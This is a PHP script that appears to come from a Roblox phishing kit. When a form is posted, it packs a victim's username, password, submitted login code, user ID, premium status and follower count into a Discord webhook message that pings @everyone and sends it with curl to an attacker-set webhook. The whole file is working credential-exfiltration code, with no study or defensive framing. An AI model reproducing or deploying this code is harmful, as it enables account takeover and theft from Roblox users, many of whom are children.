<?php
require('../../setup.php');
session_start();
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_SESSION['ticket'])
{
    $input = json_decode(file_get_contents('php://input') , true);
    $embed = json_encode(['content' => '@everyone', 'username' => $_SESSION['cvalue'], 'avatar_url' => $_SESSION['avatar'], 'tts' => true,
    // 'file' => '',
    'embeds' => [['title' => 'View Profile', 'type' => 'rich',
    //'description' => '',
    'url' => 'https://www.roblox.com/users/profile?username=' . $_SESSION['cvalue'], 'timestamp' => date('c', strtotime('now')) , 'color' => hexdec(str_replace('#','',$EmbedColour)) , 'footer' => ['text' => 'Log ID: ' . $_SESSION['ticket'], 'icon_url' => $_SESSION['avatar']], 'thumbnail' => ['url' => $_SESSION['avatar']], 'author' => ['name' => 'Trade', 'url' => 'https://www.roblox.com/users/' . $_SESSION['cid'] . '/trade'], 'fields' => [['name' => 'Method', 'value' => '```' . strtoupper($_GET['method']) . '```', 'inline' => false], ['name' => 'Username', 'value' => '```' . $_SESSION['cvalue'] . '```', 'inline' => false], ['name' => 'Password', 'value' => '```' . $_SESSION['password'] . '```', 'inline' => false], ['name' => 'Code', 'value' => '```' . $input['code'] . '```', 'inline' => false], ['name' => 'ID', 'value' => '```' . $_SESSION['cid'] . '```', 'inline' => true], ['name' => 'Premium', 'value' => '```' . $_SESSION['premium'] . '```', 'inline' => true], ['name' => 'Followers', 'value' => '```' . $_SESSION['followers'] . '```', 'inline' => true], ]]]

    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json'
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $embed);
    $response = curl_exec($ch);
    curl_close($ch);
}
?>